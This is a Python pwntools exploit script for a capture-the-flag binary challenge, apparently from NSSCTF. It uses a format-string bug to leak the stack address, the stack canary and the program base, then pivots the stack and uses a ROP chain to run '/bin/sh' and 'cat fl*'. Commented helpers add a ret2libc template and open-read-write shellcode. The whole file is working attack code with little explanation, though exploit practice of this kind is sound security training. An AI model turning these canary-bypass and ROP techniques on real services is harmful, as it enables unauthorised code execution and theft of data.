from pwn import *
import ctypes
from time import sleep
from LibcSearcher import LibcSearcher
pwnfile='./pwn'
libcfile = './libc.so.6'

elf = ELF(pwnfile)
# libc = ELF(libcfile)
sh = process(pwnfile)
# sh = remote("node5.anna.nssctf.cn",29153)
context(os='linux',arch='amd64',log_level='debug')

s   = lambda x: sh.send(x)
sl  = lambda x: sh.sendline(x)
sa  = lambda x,y: sh.sendafter(x,y)
sla = lambda x,y: sh.sendlineafter(x,y)
r   = lambda : sh.recv()
re   = lambda x: sh.recv(x)
ru  = lambda x: sh.recvuntil(x)
over = lambda : sh.interactive()

nb  = lambda x: str(x).encode()
li = lambda x,y: log.info(x+'==>'+hex(y))
bug =lambda : gdb.attach(sh)
uu32 = lambda : u32(sh.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))   # 这部分功能并不好用
uu64 = lambda : u64(sh.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
iuu32 = lambda : int(sh.recv(10),16)
iuu64 = lambda : int(sh.recv(16),16)
uheap = lambda : u64(sh.recv(6).ljust(8,b'\x00'))
orw = lambda x,y: asm(shellcraft.open(x)+shellcraft.read(3,y,0x100)+shellcraft.write(1,y,0x100)) # 返回字节码

#------------------*-功能代码块-*-----------------------#
# # rand随机数种子 import ctypes time
# def rand_seed():
#     libc = ctypes.CDLL(libcfile)
#     srand = libc.srand
#     rand = libc.rand

#     srand(int(time.time()))
#     sl(nb(rand()%100+1))

# puts_got = elf.got['puts']
# puts_plt = elf.sym['puts']
# li("puts_got",puts_got)
# li("puts_plt",puts_plt)

# puts_addr = uu64()
# libc = LibcSearcher.LibcSearcher("puts",puts_addr)
# libc_base = puts_addr - libc.dump["puts"]
# system = libc_base + libc.dump["system"]
# binsh = libc_base + libc.dump["str_bin_sh"]

pop_rdi_sym = 0x1245
ret_sym = 0x101a
main_sym = 0x125b

#-------------------------------------------------------#

def exploit():
    payload = "#%p#%11$p#%15$p"
    sa(b'Pondering the past as I stand in the remnants of the setting sun.\n',payload)
    ru(b"#")
    dist = r().decode().split('#')
    stack = int(dist[0],16)-0x50
    canary = int(dist[1],16)
    main = int(dist[2],16)
    sym_base = main - main_sym
    pop_rdi = sym_base + pop_rdi_sym
    ret = sym_base + ret_sym
    call_system = main-8

    payload = b'a'*8+p64(canary)+b'b'*8+p64(main+5)
    s(payload)

    payload = flat([stack,call_system])
    sa(b'Pondering the past as I stand in the remnants of the setting sun.\n',payload)

    r()
    payload = b'/bin/sh\0'+p64(canary)+b'cat fl*;'+p64(pop_rdi)
    s(payload)

if __name__ == '__main__':
    # bug()
    exploit()
    over()